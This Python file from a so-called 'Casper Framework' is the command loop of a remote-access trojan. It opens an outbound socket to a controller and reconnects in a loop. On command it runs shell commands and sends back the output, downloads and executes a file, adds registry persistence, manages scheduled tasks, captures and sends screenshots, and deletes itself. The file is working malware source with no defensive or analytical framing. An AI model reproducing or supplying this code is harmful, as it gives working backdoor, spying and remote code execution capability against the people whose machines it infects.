"""
Part of Casper Framework
"""
from includes import *

def socket_create():
	global socket_server

	try:
		socket_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		return True
	except socket.error as e:
		logging.debug("[casper] Unable to setup socket >> {}".format(e))

def socket_test():
	test_host = "google.com"
	test_port = 80

	logging.debug("[casper] Testing our connection on {}:{}, please wait!".format(test_host,test_port))
	if (socket_create() == True):
		try:
			socket_server.connect((test_host,test_port))
			logging.debug("[casper] Connection seems alright!")
			return True
		except Exception as e:
			logging.debug("[casper] Unable to connect >> {}".format(e))
		socket_server.close()

def socket_control():
	host = "127.0.0.1"
	port = 4445
	buffer = 1048576
	
	if (socket_test() == True):
		while True:
			if (socket_create() == True):
				try:
					logging.debug("[casper] Connecting to {}:{}".format(host,port))
					socket_server.connect((host,port))
					logging.debug("[casper] Connection established!")
					while True:
						data = decode(socket_server.recv(buffer))
						if (data.split()[0] == "shell"):
							try:
								process_create = os.popen(data.split()[1])
								process_result = process_create.read()
								if process_result:
									socket_server.send(encode(process_result))
								else:
									socket_server.send(encode("\nError while getting command result\n"))
							except Exception as e:
								socket_server.send(encode("\nError while executing command\n"))
						elif (data.split()[0] == "quit"):
							socket_server.send(encode("\nExiting/shutting down server\n"))
							socket_server.close()
							sys.exit()
						elif (data.split()[0] == "download"):
							if (download_execute(data.split()[1],"tmp.exe",1) == True):
								socket_server.send(encode("\nDownload and execute finished\n"))
							else:
								socket_server.send(encode("\nError while downloading and execute\n"))						
						elif (data.split()[0] == "infect"):
							if (infect_registry() == True):
								socket_server.send(encode("\nRegistry infection finished\n"))
							else:
								socket_server.send(encode("\nError during registry infection\n"))
						elif (data.split()[0] == "removal"):
							if (removal() == True):
								socket_server.send(encode("\nSuccessfully deleted myself\n"))
							else:
								socket_server.send(encode("\nError during deletion of myself\n"))
						elif (data.split()[0] == "schtasks"):
							if (data.split()[1] == "create"):
								if (create_task(data.split()[2],data.split()[3]) == True):
									socket_server.send(encode("\nSuccessfully created schtask\n"))
								else:
									socket_server.send(encode("\Eroror during creation of schtask\n"))
							else:
								pass
							if (data.split()[1] == "run"):
								if  (run_task(data.split()[2]) == True):
									socket_server.send(encode("\nSuccessfully ran schtask\n"))
								else:
									socket_server.send(encode("\Eroror while running schtask\n"))
							else:
								pass									
							if (data.split()[1] == "delete"):
								if  (del_task(data.split()[2]) == True):
									socket_server.send(encode("\nSuccessfully deleted schtask\n"))
								else:
									socket_server.send(encode("\Eroror during deletion of schtask\n"))
							else:
								pass									
						elif (data.split()[0] == "screenshot"):
								try:
									with mss.mss() as screen:
										logging.debug('[casper] Getting monitors')
										image = screen.grab(screen.monitors[1-1])
										
										logging.debug('[casper] Reading image raw_bytes')
										raw_bytes = mss.tools.to_png(image.rgb,image.size)
										
										logging.debug('[casper] Successfully read image raw_bytes')
										socket_server.send(encode(raw_bytes))
										socket_server.send(encode("\nSuccessfully received screenshot\n"))	
								except Exception as e:
									logging.debug("[casper] Error saving screenshot >> {}".format(e))
						else:
							pass
				except Exception as e:
					logging.debug("[casper] Unable to connect >> {}".format(e))
			else:
				logging.debug("[casper] Unable to setup socket!")
			
			logging.debug("[casper] Closing socket")
			socket_server.close()
			
			logging.debug("[casper] Idling a while")
			time.sleep(random.randint(5,15))
	else:
		logging.debug("[casper] Quiting...")
		sys.exit()